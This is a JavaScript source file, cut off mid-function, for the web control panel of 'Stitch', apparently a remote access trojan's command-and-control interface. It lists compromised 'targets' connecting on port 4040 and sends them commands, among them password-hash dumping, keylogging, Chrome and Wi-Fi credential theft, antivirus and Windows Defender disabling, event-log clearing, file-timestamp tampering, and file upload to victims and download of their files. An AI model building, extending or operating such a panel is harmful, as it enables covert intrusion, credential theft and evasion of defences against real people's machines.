// Stitch Real-Time Interface - JavaScript
let socket;
let selectedConnection = null;
let commandDefinitions = {}; // Store command definitions from backend

// Command history for arrow key navigation
let commandHistory = [];
let historyIndex = -1;
const MAX_HISTORY_SIZE = 50;

// Pagination state
let connectionsPagination = {
    currentPage: 1,
    pageSize: 25,
    totalItems: 0,
    allData: []
};

let filesPagination = {
    currentPage: 1,
    pageSize: 25,
    totalItems: 0,
    allData: []
};

// Dangerous commands that require confirmation
const DANGEROUS_COMMANDS = [
    // Windows Security
    'clearev',
    'avkill',
    'disableRDP',
    'disableUAC',
    'disableWindef',
    'scanreg',
    
    // System Control
    'lockscreen',
    'displayoff',
    'freeze start',
    'freeze',
    'shutdown',
    'reboot',
    
    // Network Modifications
    'hostsfile remove',
    'hostsfile update',
    'firewall close',
    
    // File Operations
    'hide',
    'editaccessed',
    'editcreated',
    'editmodified',
    
    // Security Tools
    'hashdump',
    'keylogger start',
    'chromedump',
    'wifikeys',
    'crackpassword',
    'firewall open',
    'firewall close',
    'hostsfile update',
    'hostsfile remove'
];

// Helper function to check if a command is dangerous
function isDangerousCommand(command) {
    const cmdLower = command.toLowerCase().trim();
    return DANGEROUS_COMMANDS.some(dangerous => cmdLower.startsWith(dangerous.toLowerCase()));
}

// CSRF Token Helper
function getCSRFToken() {
    const metaTag = document.querySelector('meta[name="csrf-token"]');
    return metaTag ? metaTag.getAttribute('content') : '';
}

// Load command definitions from backend
async function loadCommandDefinitions() {
    try {
        const response = await fetch('/api/command_definitions', {
            headers: {
                'X-CSRFToken': getCSRFToken()
            }
        });
        
        if (response.ok) {
            const data = await response.json();
            commandDefinitions = data.definitions;
            console.log('Command definitions loaded:', Object.keys(commandDefinitions).length, 'commands');
        } else {
            console.error('Failed to load command definitions:', response.status);
        }
    } catch (error) {
        console.error('Error loading command definitions:', error);
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    initializeWebSocket();
    initializeNavigation();
    loadCommandDefinitions();
    loadInitialData();
    startAutoRefresh();
    initializeCommandHistory();
    initFileUpload();
    // Wire CSP-safe handlers after DOM is ready
    initializeCSPSafeHandlers();
});

// WebSocket
function initializeWebSocket() {
    socket = io();
    
    socket.on('connect', () => {
        document.getElementById('serverStatus').classList.add('online');
        document.getElementById('statusText').textContent = 'Connected';
        showToast('Connected to server', 'success');
    });
    
    socket.on('disconnect', () => {
        document.getElementById('serverStatus').classList.remove('online');
        document.getElementById('statusText').textContent = 'Disconnected';
        showToast('Disconnected from server', 'error');
    });
    
    socket.on('debug_log', (log) => {
        appendLog(log);
    });
    
    socket.on('connection_update', (data) => {
        updateConnectionStatus(data);
    });
    
    socket.on('connection_status_change', (data) => {
        updateIndividualConnectionStatus(data);
    });
    
    socket.on('connection_update', (data) => {
        document.getElementById('activeCount').textContent = data.active_connections;
        loadConnections(); // Refresh connections
    });
}

// Navigation
function initializeNavigation() {
    document.querySelectorAll('.nav-link').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            const section = link.getAttribute('data-section');
            showSection(section);
        });
    });
}

// Command History Navigation (Arrow Keys)
function initializeCommandHistory() {
    const commandInput = document.getElementById('customCommandInput');
    if (!commandInput) return;
    
    commandInput.addEventListener('keydown', (e) => {
        // Up arrow - navigate to previous command
        if (e.key === 'ArrowUp') {
            e.preventDefault(); // Prevent cursor movement
            
            if (commandHistory.length === 0) return;
            
            // Move back in history
            if (historyIndex > 0) {
                historyIndex--;
            } else {
                historyIndex = 0;
            }
            
            // Set input value to command from history
            commandInput.value = commandHistory[historyIndex];
            
            // Move cursor to end of input
            setTimeout(() => {
                commandInput.setSelectionRange(commandInput.value.length, commandInput.value.length);
            }, 0);
        }
        
        // Down arrow - navigate to next command
        else if (e.key === 'ArrowDown') {
            e.preventDefault(); // Prevent cursor movement
            
            if (commandHistory.length === 0) return;
            
            // Move forward in history
            if (historyIndex < commandHistory.length - 1) {
                historyIndex++;
                commandInput.value = commandHistory[historyIndex];
            } else {
                // At the end of history, clear input
                historyIndex = commandHistory.length;
                commandInput.value = '';
            }
            
            // Move cursor to end of input
            if (commandInput.value) {
                setTimeout(() => {
                    commandInput.setSelectionRange(commandInput.value.length, commandInput.value.length);
                }, 0);
            }
        }
        
        // Enter key - execute command
        else if (e.key === 'Enter') {
            e.preventDefault();
            executeCustomCommand();
        }
    });
}

function showSection(sectionName) {
    // Update nav links
    document.querySelectorAll('.nav-link').forEach(link => {
        link.classList.remove('active');
        if (link.getAttribute('data-section') === sectionName) {
            link.classList.add('active');
        }
    });
    
    // Update sections
    document.querySelectorAll('.content-section').forEach(section => {
        section.classList.remove('active');
    });
    document.getElementById(`${sectionName}-section`).classList.add('active');
    
    // Load data for section
    if (sectionName === 'connections') {
        loadConnections();
        loadServerStatus();
    } else if (sectionName === 'files') {
        loadFiles();
    } else if (sectionName === 'logs') {
        loadLogs();
    }
}

// Load Data
function loadInitialData() {
    loadConnections();
    loadServerStatus();
}

async function loadServerStatus() {
    const loadingIndicator = document.getElementById('statusLoadingIndicator');
    if (loadingIndicator) loadingIndicator.classList.add('show');
    
    try {
        const response = await fetch('/api/server/status');
        const status = await response.json();
        
        document.getElementById('serverListening').textContent = 
            status.listening ? '✅ Listening' : '⚠️ Not Listening';
        document.getElementById('serverPort').textContent = status.port;
        document.getElementById('activeCount').textContent = status.active_connections;
    } catch (error) {
        showToast('Error loading server status', 'error');
    } finally {
        if (loadingIndicator) loadingIndicator.classList.remove('show');
    }
}

async function loadConnections() {
    const loadingIndicator = document.getElementById('connectionsLoadingIndicator');
    if (loadingIndicator) loadingIndicator.classList.add('show');
    
    try {
        const response = await fetch('/api/connections');
        const connections = await response.json();
        
        // Store all data for pagination
        connectionsPagination.allData = connections;
        connectionsPagination.totalItems = connections.length;
        
        // Get paginated data
        const paginatedConnections = paginateData(
            connections, 
            connectionsPagination.currentPage, 
            connectionsPagination.pageSize
        );
        
        const grid = document.getElementById('connectionsGrid');
        
        if (connections.length === 0) {
            grid.innerHTML = `
                <div class="empty-state">
                    <p>🔍 No connections found</p>
                    <p class="help-text">Connections will appear here when devices connect to port 4040</p>
                </div>
            `;
            renderPaginationControls('connectionsPaginationControls', connectionsPagination, 'connections');
            return;
        }
        
        grid.innerHTML = paginatedConnections.map(conn => {
            const isSelected = selectedConnection && selectedConnection.id === conn.id;
            const statusClass = conn.status === 'online' ? 'online' : 'offline';
            const selectedClass = isSelected ? 'selected' : '';
            
            // Format timestamps
            const lastSeen = conn.last_seen !== 'N/A' && conn.last_seen 
                ? new Date(conn.last_seen).toLocaleString() 
                : 'N/A';
            const connectedAt = conn.connected_at !== 'N/A' && conn.connected_at 
                ? new Date(conn.connected_at).toLocaleString() 
                : 'N/A';
            
            const quickActions = conn.status === 'online' ? `
                <div class="quick-actions">
                    <button class="quick-btn" data-quick="info" title="Get full system info">📊 Info</button>
                    <button class="quick-btn" data-quick="screen" title="Capture screenshot">📸 Screen</button>
                    <button class="quick-btn" data-quick="hashdump" title="Dump password hashes">🔑 Hashes</button>
                    <button class="quick-btn" data-quick="commands" title="Open command panel">⚡ Commands</button>
                </div>
            ` : '';
            
            return `
                <div class="connection-card ${statusClass} ${selectedClass}" 
                     data-connection-id="${conn.id}"
                     data-hostname="${conn.hostname}"
                     data-status="${conn.status}">
                    <div class="connection-header">
                        <div class="connection-status-indicator">
                            <h3>${conn.hostname}</h3>
                            <div class="connection-pulse ${conn.status}"></div>
                        </div>
                        <div class="connection-status">
                            <span class="status-dot ${conn.status}"></span>
                            <span class="status-text ${conn.status}">${conn.status.toUpperCase()}</span>
                        </div>
                    </div>
                    <div class="connection-info">
                        <p><strong>IP:</strong> ${conn.target}</p>
                        <p><strong>User:</strong> ${conn.user}</p>
                        <p><strong>OS:</strong> ${conn.os}</p>
                        <p><strong>Port:</strong> ${conn.port}</p>
                        ${conn.status === 'online' ? `<p><strong>Last Seen:</strong> <span class="last-seen">${lastSeen}</span></p>` : ''}
                        ${conn.status === 'online' ? `<p><strong>Connected:</strong> ${connectedAt}</p>` : ''}
                    </div>
                    ${quickActions}
                </div>
            `;
        }).join('');
        
        // Render pagination controls
        renderPaginationControls('connectionsPaginationControls', connectionsPagination, 'connections');
        
    } catch (error) {
        showToast('Error loading connections', 'error');
    } finally {
        if (loadingIndicator) loadingIndicator.classList.remove('show');
    }
}

function selectConnection(id, hostname, status) {
    selectedConnection = { id, hostname, status };
    
    // Update UI
    loadConnections(); // Refresh to show selection
    
    updateSelectedConnectionInfo();
}

function updateSelectedConnectionInfo() {
    const infoDiv = document.getElementById('selectedConnectionInfo');
    if (infoDiv && selectedConnection) {
        const { id, hostname, status } = selectedConnection;
        const statusIcon = status === 'online' ? '✅' : status === 'idle' ? '🟡' : status === 'stale' ? '⚪' : '⚫';
        const statusColor = status === 'online' ? 'var(--success)' : status === 'offline' ? 'var(--danger)' : 'var(--warning)';
        
        if (status === 'online') {
            infoDiv.innerHTML = `
                <strong>${statusIcon} Selected Target:</strong> ${hostname} (${id}) - <span style="color: ${statusColor}; font-weight: bold;">${status.toUpperCase()}</span><br>
                <em>Ready for command execution - Switch to Commands tab</em>
            `;
            infoDiv.style.borderColor = 'var(--success)';
            showToast(`✓ Target selected: ${hostname} - Ready for commands`, 'success');
        } else {
            infoDiv.innerHTML = `
                <strong>${statusIcon} Selected Target:</strong> ${hostname} (${id}) - <span style="color: ${statusColor}; font-weight: bold;">${status.toUpperCase()}</span><br>
                <em>⚠️ This connection is ${status}. Commands may not execute properly.</em>
            `;
            infoDiv.style.borderColor = statusColor;
            showToast(`⚠️ ${hostname} is ${status} - Commands may fail`, 'warning');
        }
    }
    
    // Update persistent target indicator in nav
    updateTargetIndicator(hostname, status);
}

function showCommands(category) {
    // Update command groups only; caller handles active button state
    document.querySelectorAll('.command-group').forEach(group => {
        group.classList.remove('active');
    });
    const targetGroup = document.getElementById(`${category}Commands`);
    if (targetGroup) {
        targetGroup.classList.add('active');
    }
}

async function executeCommand(command) {
    const outputElem = document.getElementById('commandOutput');
    
    // Check if command is dangerous and require confirmation
    if (isDangerousCommand(command)) {
        const confirmed = confirm(
            `⚠️ WARNING: '${command}' is a destructive command.\n\n` +
            `This action could:\n` +
            `• Disable security features\n` +
            `• Clear system logs\n` +
            `• Disrupt system operations\n` +
            `• Lock the target system\n\n` +
            `Are you sure you want to proceed?`
        );
        
        if (!confirmed) {
            outputElem.textContent = `🚫 Command cancelled by user: ${command}`;
            showToast('Command cancelled', 'warning');
            return;
        }
    }
    
    outputElem.textContent = '⏳ Executing command...\n\n';
    
    try {
        const response = await fetch('/api/execute', {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'X-CSRFToken': getCSRFToken()
            },
            body: JSON.stringify({
                connection_id: selectedConnection ? selectedConnection.id : null,
                command: command
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            outputElem.textContent = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
            outputElem.textContent += `⚡ Command: ${result.command}\n`;
            outputElem.textContent += `🕒 Time: ${new Date(result.timestamp).toLocaleString()}\n`;
            outputElem.textContent += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
            outputElem.textContent += result.output;
            showToast('Command executed', 'success');
        } else {
            outputElem.textContent = `❌ Error: ${result.error}`;
            showToast('Command failed', 'error');
        }
    } catch (error) {
        outputElem.textContent = `❌ Network error: ${error.message}`;
        showToast('Network error', 'error');
    }
}

function executeCommandWithParam(command) {
    if (!selectedConnection) {
        showToast('Please select a connection first', 'error');
        return;
    }
    
    // Check if we have command definitions for this command
    const cmdParts = command.split(' ');
    const cmdName = cmdParts[0];
    const subCommand = cmdParts[1];
    
    if (commandDefinitions[cmdName]) {
        const cmdDef = commandDefinitions[cmdName];
        
        // Handle subcommands
        if (subCommand && cmdDef.subcommands && cmdDef.subcommands[subCommand]) {
            const subCmdDef = cmdDef.subcommands[subCommand];
            if (subCmdDef.parameters && subCmdDef.parameters.length > 0) {
                showInteractiveCommandForm(command, subCmdDef);
                return;
            }
        } 
        // Handle direct command parameters
        else if (cmdDef.parameters && cmdDef.parameters.length > 0) {
            showInteractiveCommandForm(command, cmdDef);
            return;
        }
    }
    
    // Fallback to simple prompt for unknown commands
    const param = prompt(`Enter parameter for ${command}:`);
    if (param !== null && param.trim() !== '') {
        executeCommand(`${command} ${param.trim()}`);
    }
}

function executeCustomCommand() {
    const input = document.getElementById('customCommandInput');
    const command = input.value.trim();
    
    // Validation constants
    const MAX_COMMAND_LENGTH = 500;
    const MIN_COMMAND_LENGTH = 1;
    
    // Validate empty command
    if (!command || command.length < MIN_COMMAND_LENGTH) {
        showToast('Please enter a command', 'warning');
        return;
    }
    
    // Validate command length
    if (command.length > MAX_COMMAND_LENGTH) {
        showToast(`Command too long (max ${MAX_COMMAND_LENGTH} characters)`, 'error');
        return;
    }
    
    // Check for dangerous patterns (null bytes, control characters)
    if (/[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]/.test(command)) {
        showToast('Command contains invalid control characters', 'error');
        return;
    }
    
    // Sanitize: remove excessive whitespace
    const sanitizedCommand = command.replace(/\s+/g, ' ').trim();
    
    if (sanitizedCommand) {
        // Add to command history (avoid duplicates of last command)
        if (commandHistory.length === 0 || commandHistory[commandHistory.length - 1] !== sanitizedCommand) {
            commandHistory.push(sanitizedCommand);
            // Limit history size
            if (commandHistory.length > MAX_HISTORY_SIZE) {
                commandHistory.shift();
            }
        }
        // Reset history index
        historyIndex = commandHistory.length;
        
        executeCommand(sanitizedCommand);
        input.value = '';
    } else {
        showToast('Invalid command format', 'warning');
    }
}

// Show interactive command form based on command definitions
function showInteractiveCommandForm(command, cmdDef) {
    const modal = document.createElement('div');
    modal.className = 'command-modal';
    modal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h3>🔧 ${command.toUpperCase()} Command</h3>
                <button class="modal-close" data-action="close">&times;</button>
            </div>
            <div class="modal-body">
                <form id="commandForm">
                    ${cmdDef.parameters.map(param => `
                        <div class="form-group">
                            <label for="param_${param.name}">${param.prompt}:</label>
                            ${param.type === 'select' ? `
                                <select id="param_${param.name}" name="${param.name}" ${param.required ? 'required' : ''}>
                                    ${param.options.map(opt => `<option value="${opt}">${opt}</option>`).join('')}
                                </select>
                            ` : param.type === 'number' ? `
                                <input type="number" id="param_${param.name}" name="${param.name}" 
                                       placeholder="${param.placeholder || ''}" ${param.required ? 'required' : ''}>
                            ` : `
                                <input type="text" id="param_${param.name}" name="${param.name}" 
                                       placeholder="${param.placeholder || ''}" ${param.required ? 'required' : ''}>
                            `}
                        </div>
                    `).join('')}
                    ${cmdDef.confirmation ? `
                        <div class="form-group confirmation-group">
                            <label class="checkbox-label">
                                <input type="checkbox" id="confirmExecution" required>
                                <span class="checkmark"></span>
                                I understand the risks and want to execute this command
                            </label>
                        </div>
                    ` : ''}
                    ${cmdDef.dangerous ? `
                        <div class="warning-box">
                            <strong>⚠️ WARNING:</strong> This is a potentially dangerous command that may cause system damage or data loss.
                        </div>
                    ` : ''}
                </form>
            </div>
            <div class="modal-footer">
                <button class="cmd-btn" data-action="execute" data-base-command="${command}">Execute Command</button>
                <button class="clear-btn" data-action="cancel">Cancel</button>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    // Wire modal buttons without inline handlers
    const closeBtn = modal.querySelector('[data-action="close"]');
    if (closeBtn) closeBtn.addEventListener('click', closeCommandModal);
    const cancelBtn = modal.querySelector('[data-action="cancel"]');
    if (cancelBtn) cancelBtn.addEventListener('click', closeCommandModal);
    const execBtn = modal.querySelector('[data-action="execute"]');
    if (execBtn) execBtn.addEventListener('click', () => submitCommandForm(command));

    // Focus first input
    const firstInput = modal.querySelector('input, select');
    if (firstInput) firstInput.focus();
}

function closeCommandModal() {
    const modal = document.querySelector('.command-modal');
    if (modal) {
        modal.remove();
    }
}

function submitCommandForm(baseCommand) {
    const form = document.getElementById('commandForm');
    const formData = new FormData(form);
    const parameters = {};
    
    // Collect all parameters
    for (let [key, value] of formData.entries()) {
        if (key !== 'confirmExecution') {
            parameters[key] = value;
        }
    }
    
    closeCommandModal();
    
    // Execute the command with parameters
    executeCommandWithParameters(baseCommand, parameters);
}

// Execute command with structured parameters
async function executeCommandWithParameters(command, parameters) {
    if (!selectedConnection) {
        showToast('Please select a connection first', 'error');
        return;
    }
    
    // Show loading state
    const outputElement = document.getElementById('commandOutput');
    outputElement.textContent = `⏳ Executing ${command}...`;
    
    try {
        const response = await fetch('/api/execute', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRFToken': getCSRFToken()
            },
            body: JSON.stringify({
                connection_id: selectedConnection.id,
                command: command,
                parameters: parameters
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            outputElement.textContent = result.output;
            showToast('Command executed successfully', 'success');
            
            // Add to command history
            addToCommandHistory(command);
        } else {
            outputElement.textContent = `❌ Error: ${result.error}`;
            showToast(`Command failed: ${result.error}`, 'error');
        }
    } catch (error) {
        outputElement.textContent = `❌ Network error: ${error.message}`;
        showToast('Network error occurred', 'error');
    }
}

function clearOutput() {
    if (confirm('⚠️ Clear all command output?\n\nThis will remove all execution history from the display.')) {
        document.getElementById('commandOutput').textContent = 'Ready to execute commands...';
        showToast('Output cleared', 'info');
    }
}

function clearDebugLogs() {
    if (confirm('⚠️ Clear debug logs?\n\nThis will remove all log entries from the display.')) {
        document.getElementById('debugLogs').innerHTML = '';
        showToast('Logs cleared', 'info');
    }
}

function copyOutput() {
    const outputElem = document.getElementById('commandOutput');
    const text = outputElem.textContent;
    
    if (!text || text === 'Ready to execute commands...') {
        showToast('No output to copy', 'warning');
        return;
    }
    
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text)
            .then(() => {
                showToast('Output copied to clipboard', 'success');
            })
            .catch(err => {
                console.error('Clipboard API failed:', err);
                fallbackCopyToClipboard(text);
            });
    } else {
        fallbackCopyToClipboard(text);
    }
}

function fallbackCopyToClipboard(text) {
    const textArea = document.createElement('textarea');
    textArea.value = text;
    textArea.style.position = 'fixed';
    textArea.style.left = '-999999px';
    textArea.style.top = '-999999px';
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    
    try {
        const successful = document.execCommand('copy');
        if (successful) {
            showToast('Output copied to clipboard', 'success');
        } else {
            showToast('Failed to copy output', 'error');
        }
    } catch (err) {
        console.error('Fallback copy failed:', err);
        showToast('Clipboard access denied', 'error');
    } finally {
        document.body.removeChild(textArea);
    }
}

async function loadFiles() {
    const loadingIndicator = document.getElementById('filesLoadingIndicator');
    if (loadingIndicator) loadingIndicator.classList.add('show');
    
    try {
        const response = await fetch('/api/files/downloads');
        const files = await response.json();
        
        // Store all data for pagination
        filesPagination.allData = files;
        filesPagination.totalItems = files.length;
        
        // Get paginated data
        const paginatedFiles = paginateData(
            files,
            filesPagination.currentPage,
            filesPagination.pageSize
        );
        
        const grid = document.getElementById('filesGrid');
        
        if (files.length === 0) {
            grid.innerHTML = `
                <div class="empty-state">
                    <p>📁 No files found</p>
                    <p class="help-text">Downloaded files will appear here</p>
                </div>
            `;
            renderPaginationControls('filesPaginationControls', filesPagination, 'files');
            return;
        }
        
        grid.innerHTML = paginatedFiles.map(file => `
            <div class="file-item">
                <div class="file-info">
                    <div class="file-name">📄 ${file.name}</div>
                    <div class="file-details">
                        Size: ${formatBytes(file.size)} | Modified: ${new Date(file.modified).toLocaleString()}
                    </div>
                </div>
                <a href="/api/files/download/${encodeURIComponent(file.path)}" 
                   class="download-btn">Download</a>
            </div>
        `).join('');
        
        // Render pagination controls
        renderPaginationControls('filesPaginationControls', filesPagination, 'files');
        
    } catch (error) {
        showToast('Error loading files', 'error');
    } finally {
        if (loadingIndicator) loadingIndicator.classList.remove('show');
    }
}

async function loadLogs() {
    const loadingIndicator = document.getElementById('logsLoadingIndicator');
    if (loadingIndicator) loadingIndicator.classList.add('show');
    
    try {
        const response = await fetch('/api/debug/logs?limit=100');
        const logs = await response.json();
        
        const logsDiv = document.getElementById('debugLogs');
        logsDiv.innerHTML = logs.map(log => 
            `<div class="log-entry ${log.level}">[${log.timestamp}] [${log.level}] ${log.message}</div>`
        ).join('');
        
        // Auto-scroll to bottom
        logsDiv.scrollTop = logsDiv.scrollHeight;
        
    } catch (error) {
        showToast('Error loading logs', 'error');
    } finally {
        if (loadingIndicator) loadingIndicator.classList.remove('show');
    }
}

function appendLog(log) {
    const logsDiv = document.getElementById('debugLogs');
    const logEntry = document.createElement('div');
    logEntry.className = `log-entry ${log.level}`;
    logEntry.textContent = `[${log.timestamp}] [${log.level}] ${log.message}`;
    logsDiv.appendChild(logEntry);
    
    // Auto-scroll
    logsDiv.scrollTop = logsDiv.scrollHeight;
}

// Auto-refresh
function startAutoRefresh() {
    setInterval(() => {
        const activeSection = document.querySelector('.content-section.active').id;
        
        if (activeSection === 'connections-section') {
            loadConnections();
            loadServerStatus();
        } else if (activeSection === 'logs-section') {
            loadLogs();
        }
    }, 30000); // Reduced to 30 seconds due to real-time updates
}

// Real-time connection status updates
function updateConnectionStatus(data) {
    // Update active connection count in real-time
    const activeCountElement = document.getElementById('activeCount');
    if (activeCountElement && data.active_connections !== undefined) {
        activeCountElement.textContent = data.active_connections;
        
        // Add visual feedback for changes
        activeCountElement.style.transform = 'scale(1.1)';
        activeCountElement.style.color = 'var(--primary)';
        setTimeout(() => {
            activeCountElement.style.transform = 'scale(1)';
            activeCountElement.style.color = '';
        }, 300);
    }
    
    // Show toast notification for connection changes
    if (data.active_connections !== undefined) {
        const message = `Active connections: ${data.active_connections}`;
        showToast(message, 'info', 2000);
    }
}

function updateIndividualConnectionStatus(data) {
    const { connection_id, status, last_seen } = data;
    
    // Update connection card if it exists
    const connectionCard = document.querySelector(`[data-connection-id="${connection_id}"]`);
    if (connectionCard) {
        const statusElement = connectionCard.querySelector('.connection-status');
        const statusIndicator = connectionCard.querySelector('.status-dot');
        const lastSeenElement = connectionCard.querySelector('.last-seen');
        
        if (statusElement) {
            statusElement.textContent = status.toUpperCase();
            statusElement.className = `connection-status ${status}`;
        }
        
        if (statusIndicator) {
            statusIndicator.className = `status-dot ${status}`;
            
            // Add pulse animation for status changes
            statusIndicator.style.animation = 'none';
            setTimeout(() => {
                statusIndicator.style.animation = '';
            }, 10);
        }
        
        if (lastSeenElement && last_seen) {
            lastSeenElement.textContent = `Last seen: ${formatTimestamp(last_seen)}`;
        }
        
        // Add visual feedback for status changes
        connectionCard.style.transform = 'scale(1.02)';
        connectionCard.style.boxShadow = '0 0 20px rgba(0, 217, 255, 0.3)';
        setTimeout(() => {
            connectionCard.style.transform = '';
            connectionCard.style.boxShadow = '';
        }, 500);
    }
    
    // Update selected connection if it matches
    if (selectedConnection && selectedConnection.id === connection_id) {
        selectedConnection.status = status;
        selectedConnection.last_seen = last_seen;
        updateSelectedConnectionInfo();
    }
    
    // Show status change notification
    const statusMessages = {
        'online': '🟢 Connection established',
        'offline': '🔴 Connection lost',
        'idle': '🟡 Connection idle',
        'stale': '⚪ Connection stale'
    };
    
    const message = `${connection_id}: ${statusMessages[status] || status}`;
    const toastType = status === 'online' ? 'success' : status === 'offline' ? 'error' : 'warning';
    showToast(message, toastType, 3000);
}

// Toast Notifications
function showToast(message, type = 'info') {
    const container = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    
    container.appendChild(toast);
    
    setTimeout(() => {
        toast.remove();
    }, 3000);
}

// Utilities
function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
}

// Export Functions
async function exportLogs(format) {
    try {
        const response = await fetch(`/api/export/logs?format=${format}`);
        if (!response.ok) throw new Error('Export failed');
        
        const blob = await response.blob();
        const filename = `stitch_logs_${new Date().toISOString().slice(0,19).replace(/:/g,'-')}.${format}`;
        downloadBlob(blob, filename);
        
        showToast(`Logs exported as ${format.toUpperCase()}`, 'success');
    } catch (error) {
        showToast('Failed to export logs', 'error');
        console.error('Export error:', error);
    }
}

async function exportCommandHistory(format) {
    try {
        const response = await fetch(`/api/export/commands?format=${format}`);
        if (!response.ok) throw new Error('Export failed');
        
        const blob = await response.blob();
        const filename = `stitch_commands_${new Date().toISOString().slice(0,19).replace(/:/g,'-')}.${format}`;
        downloadBlob(blob, filename);
        
        showToast(`Command history exported as ${format.toUpperCase()}`, 'success');
    } catch (error) {
        showToast('Failed to export command history', 'error');
        console.error('Export error:', error);
    }
}

function downloadBlob(blob, filename) {
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
    document.body.removeChild(a);
}

// Search and Filter Functions
function filterConnections() {
    const searchTerm = document.getElementById('connectionsSearch').value.toLowerCase();
    const statusFilter = document.getElementById('connectionsFilter').value;
    const cards = document.querySelectorAll('.connection-card');
    
    let visibleCount = 0;
    
    cards.forEach(card => {
        const text = card.textContent.toLowerCase();
        const isOnline = card.classList.contains('online');
        const status = isOnline ? 'online' : 'offline';
        
        const matchesSearch = text.includes(searchTerm);
        const matchesFilter = statusFilter === 'all' || status === statusFilter;
        
        if (matchesSearch && matchesFilter) {
            card.style.display = 'block';
            visibleCount++;
        } else {
            card.style.display = 'none';
        }
    });
    
    // Show "no results" message if nothing visible
    if (visibleCount === 0 && cards.length > 0) {
        showNoResultsMessage('connectionsGrid', 'No connections match your search/filter');
    } else {
        removeNoResultsMessage('connectionsGrid');
    }
}

function filterFiles() {
    const searchTerm = document.getElementById('filesSearch').value.toLowerCase();
    const cards = document.querySelectorAll('.file-card');
    
    let visibleCount = 0;
    
    cards.forEach(card => {
        const text = card.textContent.toLowerCase();
        
        if (text.includes(searchTerm)) {
            card.style.display = 'block';
            visibleCount++;
        } else {
            card.style.display = 'none';
        }
    });
    
    // Show "no results" message if nothing visible
    if (visibleCount === 0 && cards.length > 0) {
        showNoResultsMessage('filesGrid', 'No files match your search');
    } else {
        removeNoResultsMessage('filesGrid');
    }
}

function showNoResultsMessage(containerId, message) {
    const container = document.getElementById(containerId);
    let noResultsDiv = container.querySelector('.no-results-message');
    
    if (!noResultsDiv) {
        noResultsDiv = document.createElement('div');
        noResultsDiv.className = 'no-results-message';
        noResultsDiv.innerHTML = `<p>🔍 ${message}</p>`;
        container.appendChild(noResultsDiv);
    }
}

function removeNoResultsMessage(containerId) {
    const container = document.getElementById(containerId);
    const noResultsDiv = container.querySelector('.no-results-message');
    if (noResultsDiv) {
        noResultsDiv.remove();
    }
}

// File Upload Functions
let selectedFile = null;

function initFileUpload() {
    const uploadZone = document.getElementById('uploadZone');
    const fileInput = document.getElementById('fileInput');
    
    // Click to select file
    uploadZone.addEventListener('click', () => {
        fileInput.click();
    });
    
    // File selected
    fileInput.addEventListener('change', (e) => {
        handleFileSelect(e.target.files[0]);
    });
    
    // Drag and drop
    uploadZone.addEventListener('dragover', (e) => {
        e.preventDefault();
        uploadZone.classList.add('drag-over');
    });
    
    uploadZone.addEventListener('dragleave', () => {
        uploadZone.classList.remove('drag-over');
    });
    
    uploadZone.addEventListener('drop', (e) => {
        e.preventDefault();
        uploadZone.classList.remove('drag-over');
        
        if (e.dataTransfer.files.length > 0) {
            handleFileSelect(e.dataTransfer.files[0]);
        }
    });
}

function handleFileSelect(file) {
    if (!file) return;
    
    // Check file size (100MB limit)
    const maxSize = 100 * 1024 * 1024;
    if (file.size > maxSize) {
        showToast('File is too large. Maximum size is 100MB', 'error');
        return;
    }
    
    selectedFile = file;
    
    // Show file info
    document.getElementById('fileName').textContent = file.name;
    document.getElementById('fileSize').textContent = formatBytes(file.size);
    document.getElementById('uploadZone').style.display = 'none';
    document.getElementById('uploadInfo').style.display = 'block';
}

function cancelUpload() {
    selectedFile = null;
    document.getElementById('uploadZone').style.display = 'block';
    document.getElementById('uploadInfo').style.display = 'none';
    document.getElementById('uploadProgress').style.display = 'none';
    document.getElementById('fileInput').value = '';
}

async function uploadFile() {
    if (!selectedFile) {
        showToast('No file selected', 'error');
        return;
    }
    
    if (!selectedConnection) {
        showToast('No target connection selected', 'error');
        return;
    }
    
    // Show progress
    document.getElementById('uploadInfo').style.display = 'none';
    document.getElementById('uploadProgress').style.display = 'block';
    
    try {
        const formData = new FormData();
        formData.append('file', selectedFile);
        formData.append('target_id', selectedConnection.id);
        
        const xhr = new XMLHttpRequest();
        
        xhr.upload.addEventListener('progress', (e) => {
            if (e.lengthComputable) {
                const percent = Math.round((e.loaded / e.total) * 100);
                document.getElementById('progressFill').style.width = percent + '%';
                document.getElementById('progressText').textContent = `Uploading... ${percent}%`;
            }
        });
        
        xhr.addEventListener('load', () => {
            if (xhr.status === 200) {
                const response = JSON.parse(xhr.responseText);
                showToast('File uploaded successfully!', 'success');
                cancelUpload();
                
                // Show result in command output
                if (response.output) {
                    const outputElem = document.getElementById('commandOutput');
                    outputElem.textContent = response.output + '\n' + (outputElem.textContent || '');
                }
            } else {
                const error = JSON.parse(xhr.responseText);
                showToast(error.error || 'Upload failed', 'error');
                cancelUpload();
            }
        });
        
        xhr.addEventListener('error', () => {
            showToast('Upload failed - network error', 'error');
            cancelUpload();
        });
        
        xhr.open('POST', '/api/upload', true);
        // Include CSRF token header for Flask-WTF
        const csrfMeta = document.querySelector('meta[name="csrf-token"]');
        if (csrfMeta) {
            xhr.setRequestHeader('X-CSRFToken', csrfMeta.getAttribute('content'));
        }
        xhr.send(formData);
        
    } catch (error) {
        console.error('Upload error:', error);
        showToast('Upload failed: ' + error.message, 'error');
        cancelUpload();
